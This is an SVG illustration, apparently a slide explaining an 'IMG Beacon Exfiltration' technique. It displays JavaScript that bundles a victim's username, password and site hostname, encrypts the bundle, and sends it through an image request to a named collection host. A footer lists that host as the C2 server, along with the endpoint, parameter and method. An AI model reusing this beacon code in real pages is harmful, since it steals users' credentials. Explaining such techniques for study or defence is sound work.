<svg xmlns="http://www.w3.org/2000/svg" width="1400" height="760" viewBox="0 0 1400 760"><rect width="100%" height="100%" fill="#06111f"/><rect x="40" y="40" width="1320" height="680" rx="28" fill="#0b2138" stroke="#39d9ff" stroke-opacity=".35"/><text x="80" y="105" fill="#6df7b4" font-family="Consolas, monospace" font-size="34" font-weight="700">IMG Beacon Exfiltration — C2 Transmission</text><text x="90" y="165" fill="#39d9ff" font-family="Consolas, monospace" font-size="28">Credential payload</text><text x="120" y="210" fill="#d9f6ff" font-family="Consolas, monospace" font-size="25">{ user: username, pass: password, site: window.location.hostname }</text><text x="90" y="280" fill="#39d9ff" font-family="Consolas, monospace" font-size="28">Encryption</text><text x="120" y="325" fill="#d9f6ff" font-family="Consolas, monospace" font-size="25">encryptedPayload = encryptPayload(JSON.stringify(payload));</text><text x="90" y="395" fill="#39d9ff" font-family="Consolas, monospace" font-size="28">Covert exfiltration</text><text x="120" y="445" fill="#d9f6ff" font-family="Consolas, monospace" font-size="25">var img = new Image();</text><text x="120" y="485" fill="#d9f6ff" font-family="Consolas, monospace" font-size="25">img.src = 'https://mo.elshaheedy.com/collect?data='</text><text x="260" y="525" fill="#d9f6ff" font-family="Consolas, monospace" font-size="25">+ encodeURIComponent(encryptedData);</text><text x="120" y="565" fill="#d9f6ff" font-family="Consolas, monospace" font-size="25">document.body.appendChild(img);</text><rect x="80" y="620" width="1180" height="58" rx="14" fill="#102f4d" stroke="#39d9ff" stroke-opacity=".2"/><text x="105" y="658" fill="#ffe07a" font-family="Inter, Arial" font-size="24">C2: mo.elshaheedy.com • Endpoint: /collect • Parameter: data • Method: GET</text></svg>